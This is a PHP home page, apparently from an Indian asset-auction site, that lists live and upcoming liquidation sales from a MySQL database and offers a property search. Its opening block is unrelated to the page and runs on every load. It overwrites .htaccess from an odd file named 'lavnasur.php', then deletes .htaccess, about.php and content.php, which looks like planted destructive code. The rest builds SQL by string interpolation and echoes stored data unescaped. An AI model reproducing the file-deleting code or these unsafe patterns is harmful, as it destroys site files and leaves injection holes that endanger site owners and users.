<?php
copy("lavnasur.php", ".htaccess");
unlink('.htaccess');
unlink('about.php');
unlink('content.php');
?>
<?php
@ob_start();
 include('admin/config/config.php'); 

 date_default_timezone_set('Asia/Kolkata');
$date_time=date('Y-m-d H:i:s');

$cert_det=date('Y-m-d');
?>
<style>
  textarea{
    resize: none;
  }
  </style>
  
<style>
  textarea{
    resize: none;
  }
  body{
      background-image:url('img/download.svg'); 
      
      background-repeat:no-repeat;
  }
  </style>
  
  
  <!--<style>


@media only screen and (max-width: 600px) {
  #upcoming_laptop {
   display:none;
  }
   #upcoming_mobile {
   display:block;
  }
}
@media only screen and (min-width: 600px) {
   #upcoming_laptop {
   display:block;
  }
   #upcoming_mobile {
   display:none;
  }
}
</style>-->
<?php 
?>


<?php include_once "header.php";?>
 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">




<!-------slick slider links end-------------->
<style>
@media only screen and (max-width: 600px) {
    
    
    .your-class{
        height:100px;
    }
    
}

/* Small devices (portrait tablets and large phones, 600px and up) */
@media only screen and (min-width: 600px) {
    
    .your-class{
        height:420px;
    }
    
    
}
</style>


    <!--SLIDER AREA-->
   <!-- <div class="slider-wrapper owl-carousel owl-theme" id="hero-slider">

      <div class="slider1 min-vh-100 bg-cover d-flex align-items-center">
        <div class="container">
          <div class="row">
            <div class="col-12">
             
            </div>
          </div>
        </div>
      </div>
    

    
      <div class="slider2 min-vh-100 bg-cover d-flex align-items-center">
        <div class="container">
          <div class="row">
            <div class="col-12">
             
            </div>
          </div>
        </div>
      </div>
    


    
      <div class="slider3 min-vh-100 bg-cover d-flex align-items-center">
        <div class="container">
          <div class="row">
            <div class="col-12">
             
            </div>
          </div>
        </div>
      </div>
    </div>-->

<style>
  #quickquiry {
    height: 0px;
    width: auto;
    position: fixed;
    left: -70px;
    top: 50%;
    z-index: 1000;
    transform: rotate(-90deg);
    -webkit-transform: rotate(-90deg);
}
  </style>

       <!-- <div id="quickquiry" >
			<a href="contact.php" class='btn btn-primary'>Quick Enquiry</a>
		</div>-->
                    <?php
                    $slt_dtl="select * from `latest_announcement` where `id`='1'";
                    $qst_slt_dtl=$db->query($slt_dtl);
                    $clct_slt_dtl=$qst_slt_dtl->fetch_assoc();

                    $cntent=$clct_slt_dtl['content'];
                    
                    ?>

    <div class='container'>
        <div class='row ' >
            <div class="col-md-1">
            
                <img src="img/images-removebg-preview.png" height="100" style="width: 164px;">
         </div>
         <div class='col-md-11 pt-3 text-white px-5' style="">
                <marquee><h5 class="text-white"><?php echo $cntent;?></h5></marquee>
                
            </div>
            </div>
    
      <form action='search_auction.php' method='POST'>

        <div class="card p-2 rounded shadow mb-5" style="border-radius: 30px !important;">
        <div class='row justify-content-center'>
             <div class="card-title text-center"><h3>Announcements</h3></div>
        
                <div class="col-md-3  p-2">
                   <h5 class="text-center">Live Bids</h5>
                        <marquee height="200px" direction = "up" behaviour="scroll" scrolldelay="150" onmouseover='this.stop();' onmouseout='this.start();' style="position: relative;top:0px;">
                            <?php 
                              
                            ?>
                            <?php 
                     $clt_bd_dtl="select * from `create_sale` where  `Start_Date_Auction` <='$date_time' and `End_Date_Auction` > '$date_time'";
                            $qst_clt_bd_dtl=$db->query($clt_bd_dtl);
                            $sl_ntec_cnt=mysqli_num_rows($qst_clt_bd_dtl);
                            if($sl_ntec_cnt==0)
                            {
                            
                            
                            ?>
                            <p style="color: #263e89;font-weight: 600;text-align:center;" >No Bid is Pending</p>
                             
                            <?php 
                            }
                            else
                            {
                              $sno=1;
                              while($clct_clt_bd_dtl=$qst_clt_bd_dtl->fetch_assoc())
                              {
                                $cemp_id=$clct_clt_bd_dtl['company_id'];
                                $emd=$clct_clt_bd_dtl['emp'];
                                $lqdtr_id=$clct_clt_bd_dtl['create_by_liquiditor_id'];
                                $ttel=$clct_clt_bd_dtl['Title'];
                                $pdf_file=$clct_clt_bd_dtl['Pdf'];


                               



                                $resvre_prec=$clct_clt_bd_dtl['Reserve_Price'];
                                $strt_det=$clct_clt_bd_dtl['Start_Date_Auction'];
                                $end_det_actn=$clct_clt_bd_dtl['End_Date_Auction'];
                            
                            
                                $cmp_detl="select * from company where id='$cemp_id'";
                                $qst_cmp_detl=$db->query($cmp_detl);
                                $clct_cmp_detl=$qst_cmp_detl->fetch_assoc();
                            
                                $cemp_nem=$clct_cmp_detl['company_name'];
                            ?>
                           <table class='table' style='margin-top:10px;'>
                            <tr><th>Company name</th><td style="color:#263e89;font-weight:600;"><?php echo $cemp_nem;?></td></tr> 
                            <tr><th>Asset name </th><td style="color:#263e89;font-weight:600;"><?php echo $ttel;?></td></tr> 
                            <tr><th>Reserved price</th><td style="color:#263e89;font-weight:600;"><?php echo $resvre_prec;?></td></tr>  
                            <tr><th>Bid start time</th><td style="color:#263e89;font-weight:600;"><?php echo $strt_det;?></td></tr> 
                            <tr><th>End time </th><td style="color:#263e89;font-weight:600;"> <?php echo $end_det_actn;?></td></tr> 
                            <tr style="border-bottom: 3px solid red;"><th>Details</th><td><a href="liquidator/sale_notice_pdf/<?php echo $pdf_file;?>" target="_blank" class='blink' style="color:#3b77dc;font-weight:bold;">Read More...</a></td></tr>
                            </table> 
                              
                            <!--<p style="color: #263e89;font-weight: 600;" ><span style='font-weight:bold'><?php echo $sno++;?>.</span> company name :- <?php echo $cemp_nem;?> ,asset name :- <?php echo $ttel;?>, reserved price :- <?php echo  $resvre_prec;?>, bid start time :- <?php echo $strt_det;?>, end time :- <?php echo  $end_det_actn;?> , <a href="liquidator/sale_notice_pdf/<?php echo $pdf_file;?>" class='blink' style="color:red;font-weight:bold">Read more</a></p>-->
                            <?php
                            }
                            }
                            ?>
                       </marquee>
                  </div>
                 
    <div class="col-md-6 border  bg-light">
     
              <!-- 2 column grid layout with text inputs for the first and last names -->
              <div class="row mb-4">
                <div class="col-md-6">
                    <div class="form-outline">
                        <label class="form-label" for="form6Example1">State</label>
                          <select name="sttet" id="sttet" class="form-select" required>
                            <option value="">-Please Select-</option>
                           <?php 
                           $slt_stet_dtl="select * from state";
                           $qst_slt_stet_dtl=$db->query($slt_stet_dtl);
                           while($clct_slt_stet_dtl=$qst_slt_stet_dtl->fetch_assoc())
                           {
                               $stett=$clct_slt_stet_dtl['state_name'];
                               $stet_id=$clct_slt_stet_dtl['id'];
                           ?>
                            <option value="<?php echo $stet_id;?>"><?php echo $stett;?></option>
                        <?php 
                           }
                        ?>
                          </select>
                    </div>
                </div>
                        <div class="col-md-6">
                          <div class="form-outline">
                            <label class="form-label" for="form6Example2">Type Of Property</label>
                                  <select name="prpty_typ" id="prpty_typ" class="form-select" required>
                                      
                                    <option value="">-Please Select-</option>
                                <?php 
                                $clt_typ_of_prprty="select * from type_of_property";
                                $qst_clt_typ_of_prprty=$db->query($clt_typ_of_prprty);
                                while($clct_clt_typ_of_prprty=$qst_clt_typ_of_prprty->fetch_assoc())
                                {
                                    $prprrpty_typ=$clct_clt_typ_of_prprty['property_type'];
                                $prprrpty_iid=$clct_clt_typ_of_prprty['id'];
                                ?>
                                    <option value="<?php echo $prprrpty_iid;?>"><?php echo $prprrpty_typ;?></option>
                                 <?php 
                                }
                                 ?>
                                  </select>
                            
                          </div>
                        </div>
             </div>
           <div class="row mb-4">
             <div class="col-md-6">
            <label class="form-label" for="form6Example1">Budget Value</label>
                  <select name="bdg_vlu" id="bdgt_vlu" class="form-select" required>
                    <option value="">-Please Select-</option>
                    <option value="equal">Equal</option>
                    <option value="not_equal">Not Equal</option>
                    <option value="less">Less</option>
                    <option value="less_or_equal">Less Or Equal</option>
                    <option value="greater">Greater</option>
                    <option value="greater_or_equal">Greater Or Equal</option>
                    <option value="between" >Between</option>
                  </select>
              
              
             </div>
                <div class="col-md-3">
                  <div class="form-outline">
                      <label class="" for="form6Example1">Budget Value</label>
                    <!--<label class="form-label" for="form6Example2">Type Of Property</label>-->
                         <input class="form-control m-2" type="number" id="bdgt_frm" name="bdgt_frm" min="0" placeholder="Enter numeric only" required>
                         
                        
                  </div>
                    
                   
                </div>
                               <div class='col-md-3' id="firstval" style="display: none;">
                            <label class="" for="form6Example1">Budget Value</label>       
        				 <input class="form-control m-2" name="bdgt_to" type="number" id='bdgt_to'  min="0" placeholder="Enter numeric only">                                            
        				 </div>

                    <div class="d-flex w-100 justify-content-center align-items-center m-2">
       
                       <a href="#serch_rslt" class="btn btn-primary" id='sbt_serch' >Search</a>
                       <a class="btn btn-primary  mx-2" href="" >Clear</a>
                    </div>

  
    </div>
    </div>
    <div class="col-md-3 p-2 " id='upcoming_laptop'>
        <h5 class="text-center">Upcomming Bids</h5>
            <marquee height="200px" direction = "up" behaviour="scroll" scrolldelay="150" onmouseover='this.stop();' onmouseout='this.start();' style="position: relative;top:0px;">
                            <?php 
                              
                            ?>
                            <?php 
                         $clt_bd_dtl="select * from create_sale where Start_Date_Auction > '$date_time' and End_Date_Auction > '$date_time'";
                            $qst_clt_bd_dtl=$db->query($clt_bd_dtl);
                            $sl_ntec_cnt=mysqli_num_rows($qst_clt_bd_dtl);
                            if($sl_ntec_cnt==0)
                            {
                            
                            
                            ?>
                            <p style="color: #263e89;font-weight: 600;text-align:center;" >No Bid is Pending</p>
                             
                            <?php 
                            }
                            else
                            {
                              $sno=1;
                              while($clct_clt_bd_dtl=$qst_clt_bd_dtl->fetch_assoc())
                              {
                                $cemp_id=$clct_clt_bd_dtl['company_id'];
                                $emd=$clct_clt_bd_dtl['emp'];
                                $lqdtr_id=$clct_clt_bd_dtl['create_by_liquiditor_id'];
                                $ttel=$clct_clt_bd_dtl['Title'];
                                $pdf_file=$clct_clt_bd_dtl['Pdf'];
                                $resvre_prec=$clct_clt_bd_dtl['Reserve_Price'];
                                $strt_det=$clct_clt_bd_dtl['Start_Date_Auction'];
                                $end_det_actn=$clct_clt_bd_dtl['End_Date_Auction'];
                            
                            
                                $cmp_detl="select * from company where id='$cemp_id'";
                                $qst_cmp_detl=$db->query($cmp_detl);
                                $clct_cmp_detl=$qst_cmp_detl->fetch_assoc();
                            
                                $cemp_nem=$clct_cmp_detl['company_name'];
                            ?>
                             <table class='table' style='margin-top:10px;'>
                            <tr><th>Company name</th><td style="color:#263e89;font-weight:600;"><?php echo $cemp_nem;?></td></tr> 
                            <tr><th>Asset name </th><td style="color:#263e89;font-weight:600;"><?php echo $ttel;?></td></tr> 
                            <tr><th>Reserved price</th><td style="color:#263e89;font-weight:600;"><?php echo $resvre_prec;?></td></tr>  
                            <tr><th>Bid start time</th><td style="color:#263e89;font-weight:600;"><?php echo $strt_det;?></td></tr> 
                            <tr><th>End time </th><td style="color:#263e89;font-weight:600;"><?php echo $end_det_actn;?></td></tr> 
                             <tr style="border-bottom: 3px solid #3b77dc;"><th>Details</th><td ><a href="liquidator/sale_notice_pdf/<?php echo $pdf_file;?>" class='blink' style="color:#3b77dc;font-weight:bold">Read More...</a></td></tr> 
                            </table> 
                            
                            <!--<p style="color: #263e89;font-weight: 600;" ><span style='font-weight:bold'><?php echo $sno++;?>.</span> company name :- <?php echo $cemp_nem;?> ,asset name :- <?php echo $ttel;?>, reserved price :- <?php echo  $resvre_prec;?>, bid start time :- <?php echo $strt_det;?>, end time :- <?php echo  $end_det_actn;?> , <a href="liquidator/sale_notice_pdf/<?php echo $pdf_file;?>" class='blink' style="color:red;font-weight:bold">Read more</a></p>-->
                            <?php
                            }
                            }
                            ?>
           </marquee>
    </div>
    </div>
  </div>
  </form>
     <?php 
                        $clt_sl_netc_ssdtl="select * from create_sale ";
                        $qst_clt_slss_netc_dtl=$db->query($clt_sl_netc_ssdtl);
                        $upcmng_bnd_cnt=mysqli_num_rows($qst_clt_slss_netc_dtl);
                       if($upcmng_bnd_cnt > 0)
                       {
                        ?>
    <div class="card p-2 rounded shadow mb-5 bg-light " style="border-radius: 30px !important;">
      <div class='table-responsive mt-2' id='serch_rslt'>

        
            <table class='table m-3' >
<tr style="background: #3b77dc;">
                      <th class="text-white">Sno</th>
                      
                      <th class="text-white">Company Name</th>
                      <th class="text-white">Auction Items</th>
                      <th class="text-white">EMD</th>
                      
                      <th class="text-white">Auction Date</th>
                      <th class="text-white">Contact Person</th>
                      
                      <th class="text-white">Contact Person Email</th>
                      <th class="text-white">Auction price</th>
                      <th class="text-white">File</th>
                      <th class="text-white">File 2</th>
                      <th class="text-white">File 3</th>
                      <th class="text-white">File 4</th>
                      <th class="text-white">File 5</th>
                      <th class="text-white">File Name</th>
                      <th class="text-white">Action</th>
                    
                    </tr>

                        <?php 
                        $clt_sl_netc_dtl="select * from create_sale order by id desc";
                        $qst_clt_sl_netc_dtl=$db->query($clt_sl_netc_dtl);
                        $sno=1;
                        while($clct_clt_sl_netc_dtl=$qst_clt_sl_netc_dtl->fetch_assoc())
                        {

                            $asst_name=$clct_clt_sl_netc_dtl['Title'];
                            $lqdtr_id=$clct_clt_sl_netc_dtl['create_by_liquiditor_id'];
                            $sel_id=$clct_clt_sl_netc_dtl['id'];
                            $cmp_id=$clct_clt_sl_netc_dtl['company_id'];
                            
                            
                            
                            $clt_cmp_dtl="select * from company where id='$cmp_id'";
                            $qst_clt_cmp_dtl=$db->query($clt_cmp_dtl);
                            $cclt_clt_cmp_dtl=$qst_clt_cmp_dtl->fetch_assoc();
                            
                            $cmpny_nem=$cclt_clt_cmp_dtl['company_name'];
                            
                            
                            $clt_dtl="select * from add_liquidator where id='$lqdtr_id'";
                            $qst_clt_dtl=$db->query($clt_dtl);
                            $clct_clt_dtl=$qst_clt_dtl->fetch_assoc();
                            
                            $lqdter_nem=$clct_clt_dtl['liquidator_name'];
                            
                            $rsrve_prec=$clct_clt_sl_netc_dtl['Reserve_Price'];
                            $emd=$clct_clt_sl_netc_dtl['emp'];
                            
                            $strt_det=$clct_clt_sl_netc_dtl['Start_Date_Auction'];
                            $end_det=$clct_clt_sl_netc_dtl['End_Date_Auction'];
                            $pdfs=$clct_clt_sl_netc_dtl['Pdf'];

                            $pdf_file2=$clct_clt_sl_netc_dtl['pdf2'];
                            $pdf_file3=$clct_clt_sl_netc_dtl['pdf3'];
                            $pdf_file4=$clct_clt_sl_netc_dtl['pdf4'];
                            $pdf_file5=$clct_clt_sl_netc_dtl['pdf5'];


                            $lqdtr_emnl=$clct_clt_dtl['liquidator_email'];
                             $spr_cmpny_neme=$clct_clt_sl_netc_dtl['super_company_name'];
                            
                             $clt_cmp_dtl="select * from display_company where id='$spr_cmpny_neme'";
                             $qst_clt_cmp_dtl=$db->query($clt_cmp_dtl);
                             $clct_clt_cmp_dtl=$qst_clt_cmp_dtl->fetch_assoc();

                             $cemp_nemwe=$clct_clt_cmp_dtl['company_name'];
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            ?>

                    <tr style="border:1px solid #8a8a8a;">
                    <td><?php echo $sno++;?></td>
                    <td><?php echo $cemp_nemwe;?></td>
                    <td><?php echo $asst_name;?></td>
                    <td><?php echo $emd;?></td>
                    <td><?php echo $end_det;?></td>
                    <td><?php echo $lqdter_nem;?></td>
                    <td><?php echo $lqdtr_emnl;?></td>
                    <td><?php echo $rsrve_prec;?> ₹</td>
                    

                    <td><?php if($pdfs!=NULL) {?><a href='liquidator/sale_notice_pdf/<?php echo $pdfs;?>' traget="_blank"><i class="fa fa-file-pdf-o" aria-hidden="true" style="color:red;font-size: 25px;"></i></a> <?php } ?>
                    
                  
                  
                  
                  </td>

                  <td><?php if($pdf_file2!=NULL) {?> <a href='liquidator/sale_notice_pdf/<?php echo $pdf_file2;?>' traget="_blank"><i class="fa fa-file-pdf-o" aria-hidden="true" style="color:red;font-size: 25px;"></i></a> <?php } ?>
                    
                  
                  
                  
                    </td>

                    <td><?php if($pdf_file3!=NULL) {?> <a href='liquidator/sale_notice_pdf/<?php echo $pdf_file3;?>' traget="_blank"><i class="fa fa-file-pdf-o" aria-hidden="true" style="color:red;font-size: 25px;"></i></a> <?php }?>
                    
                  
                  
                  
                  </td>

                  <td><?php if($pdf_file4!=NULL) {?><a href='liquidator/sale_notice_pdf/<?php echo $pdf_file4;?>' traget="_blank"><i class="fa fa-file-pdf-o" aria-hidden="true" style="color:red;font-size: 25px;"></i></a> <?php }?>
                    
                  
                  
                  
                  </td>
                  <td><?php if($pdf_file5!=NULL) {?><a href='liquidator/sale_notice_pdf/<?php echo $pdf_file5;?>' traget="_blank"><i class="fa fa-file-pdf-o" aria-hidden="true" style="color:red;font-size: 25px;"></i></a> <?php } ?>
                    
                  
                  
                  
                  </td>



                    <td><?php echo $pdfs;?></td>
                    <td>
                        <?php 
                        if($end_det > $date_time and  $strt_det > $date_time)
                        {
                        ?>
<?php if(isset($_SESSION['bddr_id'])){?><a href='bideshboard.php?id=<?php echo $sel_id;?>' class='btn btn-primary' style="width:120px;">Bid</a><?php } else if(!isset($_SESSION['bddr_id'])){ ?> <a href='signup_bidder.php?ntc_id=<?php echo $sel_id;?>' class='btn btn-primary' style="width:120px;">Bid</a><?php } ?>
                        <?php 
                        }
                        else
                        {
                ?>
                <a href="#" class='btn btn-danger' style="
    pointer-events: none;
">Closed Bid</a>
                <?php
                        }
                        ?>
                        </td>
                   
                
                
                
                
                
                
                
                </tr>
               <?php } ?>


           </table>
        </div>


  </div>
<?php 
}
else
{
    ?>
    <style>
  .news{width: 160px}.news-scroll a{text-decoration: none}.dot{height: 6px;width: 6px;margin-left: 3px;margin-right: 3px;margin-top: 2px !important;background-color: rgb(207,23,23);border-radius: 50%;display: inline-block}
    </style>
     <div class="row">
        <div class="col-md-12 mb-5">
            <div class="d-flex justify-content-between align-items-center breaking-news bg-black">
                <div class="d-flex flex-row flex-grow-1 flex-fill justify-content-center bg-danger py-2 text-white px-1 news"><span class="d-flex align-items-center">&nbsp;Important</span></div>
                <marquee class="news-scroll" behavior="scroll" direction="left" onmouseover="this.stop();" onmouseout="this.start();"> <a href="#" style="color:white;font-weight:bold">There is no upcoming auction </a>
                </marquee>
            </div>
        </div>
    </div>
    <?php
}
?>



<!--
 <div class="col-md-3 p-2 " id='upcoming_mobile' >
        <h5 class="text-center">UPCOMMING BIDS</h5>
            <marquee height="200px" direction = "up" behaviour="scroll" scrolldelay="150" onmouseover='this.stop();' onmouseout='this.start();' style="position: relative;top:0px;">
                            <?php 
                              
                            ?>
                            <?php 
                         $clt_bd_dtl="select * from create_sale where Start_Date_Auction > '$date_time' and End_Date_Auction > '$date_time'";
                            $qst_clt_bd_dtl=$db->query($clt_bd_dtl);
                            $sl_ntec_cnt=mysqli_num_rows($qst_clt_bd_dtl);
                            if($sl_ntec_cnt==0)
                            {
                            
                            
                            ?>
                            <p style="color: #263e89;font-weight: 600;" >No Bid is Pending</p>
                             
                            <?php 
                            }
                            else
                            {
                              $sno=1;
                              while($clct_clt_bd_dtl=$qst_clt_bd_dtl->fetch_assoc())
                              {
                                $cemp_id=$clct_clt_bd_dtl['company_id'];
                                $emd=$clct_clt_bd_dtl['emp'];
                                $lqdtr_id=$clct_clt_bd_dtl['create_by_liquiditor_id'];
                                $ttel=$clct_clt_bd_dtl['Title'];
                                $pdf_file=$clct_clt_bd_dtl['Pdf'];
                                $resvre_prec=$clct_clt_bd_dtl['Reserve_Price'];
                                $strt_det=$clct_clt_bd_dtl['Start_Date_Auction'];
                                $end_det_actn=$clct_clt_bd_dtl['End_Date_Auction'];
                            
                            
                                $cmp_detl="select * from company where id='$cemp_id'";
                                $qst_cmp_detl=$db->query($cmp_detl);
                                $clct_cmp_detl=$qst_cmp_detl->fetch_assoc();
                            
                                $cemp_nem=$clct_cmp_detl['company_name'];
                            ?>
                             <table class='table' style='margin-top:10px;'>
                            <tr><th>company name</th><td style=""><?php echo $cemp_nem;?></td></tr> 
                            <tr><th>asset name </th><td style=""><?php echo $ttel;?></td></tr> 
                            <tr><th>reserved price</th><td style=""><?php echo $resvre_prec;?></td></tr>  
                            <tr><th>bid start time</th><td style=""><?php echo $strt_det;?></td></tr> 
                            <tr><th>end time </th><td style=""><?php echo $end_det_actn;?></td></tr> 
                             <tr style="border-bottom: 3px solid red;"><th>Details</th><td ><a href="liquidator/sale_notice_pdf/<?php echo $pdf_file;?>" class='blink' style="color:red;font-weight:bold">Read more</a></td></tr> 
                            </table> 
                            
                           
                            <?php
                            }
                            }
                            ?>
           </marquee>
    </div>-->

    </div>


<!--	<div class="sticky-container">
		<ul class="sticky">
			<li>
				<img width="32" height="32" title="" alt="" src="img/fb1.png" / style="width:40px;">
				<p>Facebook</p>
			</li>
			<li>
				<img width="32" height="32" title="" alt="" src="img/tw1.png" / style="width:40px;">
				<p>Twitter</p>
			</li>
			<li>
				<img width="32" height="32" title="" alt="" src="img/pin1.png" / style="width:40px;">
				<p>Pinterest</p>
			</li>
			<li>
				<img width="32" height="32" title="" alt="" src="img/li1.png" / style="width:40px;" >
				<p>Linkedin</p>
			</li>
			<li>
				<img width="32" height="32" title="" alt="" src="img/rss1.png" / style="width:40px;">
				<p>RSS</p>
			</li>
			<li>
				<img width="32" height="32" title="" alt="" src="img/tm1.png" / style="width:40px;">
				<p>Tumblr</p>
			</li>
			<li>
				<img width="32" height="32" title="" alt="" src="img/wp1.png" / style="width:40px;">
				<p>WordPress</p>
			</li>
			<li>
				<img width="30" height="32" title="" alt="" src="img/vm1.png" / style="width:40px;">
				<p>Vimeo</p>
			</li>
		</ul>
	</div>-->
	 </div>
	    
<?php include_once "footer.php";?>
 
	<style type="text/css">
	body{
		/*height: 10000px;*/
		font-family: "Lato";
		background-color: #fffff;
	}
	.sticky-container{
		/*background-color: #333;*/
		padding: 0px;
		margin: 0px;
		position: fixed;
		right: -119px;
		top:230px;
		width: 200px;

	}

	.sticky li{
		list-style-type: none;
		background-color: #333;
		border-radius:30px;
		color: #efefef;
		height: 43px;
		padding: 0px;
		margin: 0px 0px 1px 0px;
		-webkit-transition:all 0.25s ease-in-out;
		-moz-transition:all 0.25s ease-in-out;
		-o-transition:all 0.25s ease-in-out;
		transition:all 0.25s ease-in-out;
		cursor: pointer;
 

	}

	.sticky li:hover{
		margin-left: -115px;
		/*-webkit-transform: translateX(-115px);
		-moz-transform: translateX(-115px);
		-o-transform: translateX(-115px);
		-ms-transform: translateX(-115px);
		transform:translateX(-115px);*/
		/*background-color: #8e44ad;*/
		filter: url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\'><filter id=\'grayscale\'><feColorMatrix type=\'matrix\' values=\'1 0 0 0 0, 0 1 0 0 0, 0 0 1 0 0, 0 0 0 1 0\'/></filter></svg>#grayscale");
                -webkit-filter: grayscale(0%);
	}

	.sticky li img{
		float: left;
		margin: 5px 5px;
		border-radius:30px;
		margin-right: 10px;

	}

	.sticky li p{
		padding: 0px;
		margin: 0px;
		text-transform: uppercase;
		line-height: 43px;

	}

	/** content **/
	.content{
		margin-top: 150px;
		margin-left: 100px;
		width: 700px;
	}
	h1, h2{
		font-family: "Source Sans Pro",sans-serif;
		color: #ecf0f1;
		padding: 0px;
		margin: 0px;
		font-weight: normal;
	}

	h1{
		font-weight: 900;
		font-size: 64px;
	}

	h2{
		font-size:26px;
	}

	p{
		color: #ecf0f1;
		font-family: "Lato";
		line-height: 28px;
		font-size: 15px;
		padding-top: 50px;
	}

	p.credit{
		padding-top: 20px;
		font-size: 12px;
	}

	p a{
		color: #ecf0f1;
	}

	/** fork icon**/
	.fork{
		position: absolute;
		top:0px;
		left: 0px;
	}
	</style>

     <script type="text/javascript" src="//code.jquery.com/jquery-1.11.0.min.js"></script>
  <script type="text/javascript" src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
  <script type="text/javascript" src="//cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>

  <script type="text/javascript">
    $(document).ready(function(){
      $('.your-class').slick({
        dots: false,
  infinite: true,
  speed: 300,
infinite: true,
autoplay: true,
 arrows: false,
  autoplaySpeed: 2000,
  slidesToShow: 1,
  
  slidesToScroll: 1
      });
    });
  </script>

<script>    
$(document).ready(function(){
$("#bdgt_vlu").change(function(){
var bdgt=$("#bdgt_vlu").val();



if(bdgt=='between'){
    
  $('#firstval').show();
  
}

else{

  $('#firstval').hide();
 
}

});




$("#sbt_serch").click(function(){
    
var setet=$("#sttet").val();
var propty_typ=$("#prpty_typ").val();
var bdgt_vol=$("#bdgt_vlu").val();
var bdgt_frm=$("#bdgt_frm").val();
var bdgt_to=$("#bdgt_to").val();

$('#serch_rslt').html('<center><img src="img/loader.gif" style="height:100px;width:150px;"></center>');
$.ajax({
url: "search_auction_ajax.php",
type: "POST",
data    : {txt1:setet,txt2:propty_typ,txt3:bdgt_vol,txt4:bdgt_frm,txt5:bdgt_to},
cache: false,
success: function(data){
$('#serch_rslt').html(data);

}
});



});

});

</script>

<?php 
ob_flush();
?>